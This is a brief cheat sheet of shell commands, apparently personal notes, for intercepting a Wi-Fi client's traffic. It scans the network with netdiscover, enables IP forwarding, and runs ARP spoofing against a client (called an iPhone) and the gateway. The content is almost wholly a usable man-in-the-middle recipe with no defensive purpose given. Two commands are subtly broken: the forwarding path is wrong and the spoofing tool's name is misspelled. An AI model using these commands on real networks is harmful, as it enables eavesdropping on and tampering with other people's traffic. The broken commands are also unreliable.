get info about clients on network

```sh
netdiscover -i wlan0
```

# mitm

```sh
echo 1 > /props/sys/net/ipv4/ip_forward   # enable ip forwarding
arpsoof -i wlan0 <ip_of_client> <gateway> # tell the ap we are the iphone
arpsoof -i wlan0 <gateway> <ip_of_client> # tell the iphone we are the ap
```
